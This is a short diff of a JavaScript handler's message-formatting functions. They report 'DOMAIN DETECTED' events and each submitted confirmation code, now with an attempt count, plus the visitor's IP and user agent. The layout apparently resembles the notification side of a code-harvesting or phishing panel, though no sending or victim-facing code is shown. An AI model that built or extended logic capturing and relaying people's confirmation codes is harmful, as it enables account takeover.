@@ -46,12 +46,11 @@ export default async function handler(req, res) {
 // ====== FORMAT FUNCTIONS ======
 
 function formatDomainDetection(data) {
-  const { domain, isFree, timestamp, userAgent, ip } = data;
+  const { domain, timestamp, userAgent, ip } = data;
   return `
 DOMAIN DETECTED
 ─────────────────
 DOMAIN    ${domain}
-TYPE      ${isFree ? 'FREE' : 'PURCHASED'}
 TIME      ${timestamp}
 USER      ${userAgent || 'Unknown'}
 IP        ${ip || 'Unknown'}
@@ -88,11 +87,12 @@ IP        ${ip || 'Unknown'}
 }
 
 function formatCodeSubmitted(data) {
-  const { code, timestamp, userAgent, ip } = data;
+  const { code, attempt, timestamp, userAgent, ip } = data;
   return `
 CONFIRMATION CODE SUBMITTED
 ─────────────────
 CODE      ${code}
+ATTEMPT   ${attempt || 1}
 TIME      ${timestamp}
 USER      ${userAgent || 'Unknown'}
 IP        ${ip || 'Unknown'}
